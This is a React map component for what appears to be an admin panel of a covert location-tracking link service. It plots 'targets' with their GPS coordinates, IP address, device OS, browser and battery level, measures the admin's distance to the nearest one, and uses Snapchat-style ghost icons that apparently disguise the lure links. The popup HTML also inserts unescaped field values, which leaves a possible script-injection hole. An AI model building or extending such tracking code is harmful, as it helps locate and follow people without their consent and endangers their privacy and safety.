"use client";

import React, { useEffect, useRef, useState } from "react";
import { LiveLocationItem } from "@/hooks/useRealtimeLocations";
import {
  getDarkTileLayerConfig, createSnapGhostIcon, createSnapAccuracyCircle,
  createAdminLocationIcon, createAdminAccuracyCircle, calculateDistanceMeters,
  formatDistance, fetchAdminCoordinates,
} from "@/lib/map-utils";
import { Compass } from "lucide-react";
import { useTheme } from "@/hooks/useTheme";

interface LiveMapProps {
  locations: LiveLocationItem[];
}

export const LiveMap: React.FC<LiveMapProps> = ({ locations }) => {
  const mapContainerRef = useRef<HTMLDivElement>(null);
  const mapInstanceRef = useRef<any>(null);
  const layerGroupRef = useRef<any>(null);
  const tileLayerRef = useRef<any>(null);
  const [adminLoc, setAdminLoc] = useState<{ lat: number; lng: number; acc?: number } | null>(null);
  const { theme } = useTheme();

  useEffect(() => {
    fetchAdminCoordinates((coords) => setAdminLoc(coords));
  }, []);

  useEffect(() => {
    let isMounted = true;
    async function initMap() {
      if (!mapContainerRef.current || mapInstanceRef.current) return;
      const L = (await import("leaflet")).default;
      if (!isMounted || !mapContainerRef.current) return;

      const defaultCenter: [number, number] = [20.5937, 78.9629];
      const map = L.map(mapContainerRef.current, { zoomControl: false, attributionControl: false }).setView(defaultCenter, 5);
      L.control.zoom({ position: "bottomright" }).addTo(map);

      const tileConfig = getDarkTileLayerConfig(theme);
      tileLayerRef.current = L.tileLayer(tileConfig.url, tileConfig.options).addTo(map);
      layerGroupRef.current = L.layerGroup().addTo(map);
      mapInstanceRef.current = map;
    }
    initMap();
    return () => {
      isMounted = false;
      if (mapInstanceRef.current) { mapInstanceRef.current.remove(); mapInstanceRef.current = null; }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (tileLayerRef.current) tileLayerRef.current.setUrl(getDarkTileLayerConfig(theme).url);
  }, [theme]);

  useEffect(() => {
    async function updateMarkers() {
      if (!mapInstanceRef.current || !layerGroupRef.current) return;
      const L = (await import("leaflet")).default;
      layerGroupRef.current.clearLayers();

      const bounds: [number, number][] = [];

      if (adminLoc) {
        bounds.push([adminLoc.lat, adminLoc.lng]);
        const aMarker = L.marker([adminLoc.lat, adminLoc.lng], { icon: createAdminLocationIcon(L, 28) }).addTo(layerGroupRef.current);
        if (adminLoc.acc) createAdminAccuracyCircle(L, [adminLoc.lat, adminLoc.lng], adminLoc.acc).addTo(layerGroupRef.current);
        aMarker.bindPopup(`<div style="color:#000;font-size:12px;padding:4px;"><b>📍 Your Location (Admin)</b><br/><span style="color:#555;">Acc: ±${Math.round(adminLoc.acc || 0)}m</span></div>`);
      }

      let nearestTarget: { lat: number; lng: number; dist: number } | null = null;

      for (const loc of locations) {
        const pos: [number, number] = [loc.latitude, loc.longitude];
        bounds.push(pos);
        const marker = L.marker(pos, { icon: createSnapGhostIcon(L, 38) }).addTo(layerGroupRef.current);
        if (loc.accuracy && loc.accuracy > 0) createSnapAccuracyCircle(L, pos, loc.accuracy).addTo(layerGroupRef.current);

        let distStr = "";
        if (adminLoc) {
          const dM = calculateDistanceMeters(adminLoc.lat, adminLoc.lng, loc.latitude, loc.longitude);
          distStr = formatDistance(dM);
          if (!nearestTarget || dM < nearestTarget.dist) nearestTarget = { lat: loc.latitude, lng: loc.longitude, dist: dM };
        }

        const gmapsUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        const deviceStr = [loc.deviceInfo?.os, loc.deviceInfo?.browser, loc.deviceInfo?.battery !== undefined ? `${loc.deviceInfo.battery}%` : null].filter(Boolean).join(" • ");

        marker.bindPopup(`
          <div style="color: #000; font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 12px; min-width: 190px;">
            <p style="font-weight: 800; margin: 0 0 3px 0; font-size: 13px;">${loc.linkTitle}</p>
            ${loc.ipAddress ? `<p style="margin: 0 0 2px 0; color: #444; font-size: 11px;">IP: <b>${loc.ipAddress}</b></p>` : ""}
            ${deviceStr ? `<p style="margin: 0 0 4px 0; color: #666; font-size: 11px;">${deviceStr}</p>` : ""}
            <p style="margin: 0 0 4px 0; color: #555; font-size: 11px;">Lat: ${loc.latitude.toFixed(5)}, Lng: ${loc.longitude.toFixed(5)}</p>
            ${distStr ? `<p style="margin: 0 0 4px 0; color: #1a73e8; font-weight: bold; font-size: 11px;">📏 Distance to You: ${distStr}</p>` : ""}
            <div style="display: flex; gap: 6px; margin-top: 6px;">
              <a href="${gmapsUrl}" target="_blank" rel="noopener noreferrer" style="background-color: #000; color: #FFFC00; text-decoration: none; padding: 5px 10px; border-radius: 9999px; font-weight: bold; font-size: 11px;">Google Maps ↗</a>
              ${loc.linkId ? `<a href="/admin/links/${loc.linkId}" style="background-color: #eee; color: #000; text-decoration: none; padding: 5px 10px; border-radius: 9999px; font-weight: 600; font-size: 11px;">Track Link</a>` : ""}
            </div>
          </div>
        `);
      }

      if (adminLoc && nearestTarget) {
        const nTarget: { lat: number; lng: number } = nearestTarget;
        L.polyline([[adminLoc.lat, adminLoc.lng], [nTarget.lat, nTarget.lng]], { color: "#1a73e8", weight: 2.5, opacity: 0.8, dashArray: "6, 6" }).addTo(layerGroupRef.current);
      }

      if (bounds.length > 0) mapInstanceRef.current.fitBounds(bounds, { padding: [50, 50], maxZoom: 15 });
    }

    updateMarkers();
  }, [locations, adminLoc]);

  const nearestLoc = adminLoc && locations.length > 0
    ? locations.reduce((prev, curr) => {
        const d1 = calculateDistanceMeters(adminLoc.lat, adminLoc.lng, prev.latitude, prev.longitude);
        const d2 = calculateDistanceMeters(adminLoc.lat, adminLoc.lng, curr.latitude, curr.longitude);
        return d2 < d1 ? curr : prev;
      })
    : null;

  const nearestDist = adminLoc && nearestLoc
    ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, nearestLoc.latitude, nearestLoc.longitude))
    : null;

  return (
    <div className="relative w-full h-[520px] rounded-3xl overflow-hidden border border-white/10 shadow-2xl bg-[#0F0F12]">
      <div ref={mapContainerRef} className="w-full h-full" />
      {nearestDist && nearestLoc && (
        <div className="absolute top-4 right-4 z-10">
          <button
            onClick={() => {
              if (mapInstanceRef.current && adminLoc) {
                mapInstanceRef.current.fitBounds([[adminLoc.lat, adminLoc.lng], [nearestLoc.latitude, nearestLoc.longitude]], { padding: [50, 50] });
              }
            }}
            className="py-1.5 px-3 rounded-xl text-xs font-bold border bg-blue-600/20 hover:bg-blue-600/30 border-blue-500/40 text-blue-300 transition-all shadow-lg flex items-center gap-1.5"
            title="Measure distance from your device to nearest target"
          >
            <Compass className="w-3.5 h-3.5" />
            Admin ↔ Nearest ({nearestLoc.linkTitle}): {nearestDist}
          </button>
        </div>
      )}
    </div>
  );
};
